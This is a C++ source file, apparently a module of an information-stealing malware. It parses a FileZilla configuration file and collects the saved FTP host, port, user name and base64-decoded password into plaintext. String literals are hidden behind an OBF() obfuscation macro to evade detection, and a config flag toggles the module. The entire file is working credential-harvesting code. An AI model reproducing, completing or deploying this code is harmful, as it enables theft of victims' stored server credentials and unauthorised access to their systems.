#include <fstream>

#include "config.h"
#include "utils.h"

#include "filezilla.h"

Filezilla::Filezilla(std::string path) noexcept
{
	if (!config::filezilla)
		return;

	if (!utils::isFile(path))
		return;

	std::ifstream file(path);
	std::string line;

	while (std::getline(file, line))
	{
		size_t length = this->lengthOfSubstr(line);

		if (line.find(OBF("<Host>")) != std::string::npos)
		{
			this->data.append(OBF("HOST: ") + line.substr(line.find(OBF(">")) + 1, length));
		}

		else if (line.find(OBF("<Port>")) != std::string::npos)
		{
			this->data.append(OBF(":") + line.substr(line.find(OBF(">")) + 1, length) + OBF_ENDL);
		}

		else if (line.find(OBF("<User>")) != std::string::npos)
		{
			this->data.append(OBF("USER: ") + line.substr(line.find(OBF(">")) + 1, length) + OBF_ENDL);
		}

		else if (line.find(OBF("<Pass")) != std::string::npos)
		{
			//base 64 decode
			auto pw = utils::base64_decode(line.substr(line.find(OBF(">")) + 1, length));
			this->data.append(OBF("PASSWORD: ") + std::string(pw.begin(), pw.end()) + OBF_ENDL + OBF_ENDL);
		}
	}

	file.close();
}


size_t Filezilla::lengthOfSubstr(std::string str) noexcept
{
	return str.find(OBF("/")) - str.find(OBF(">")) - 2;
}
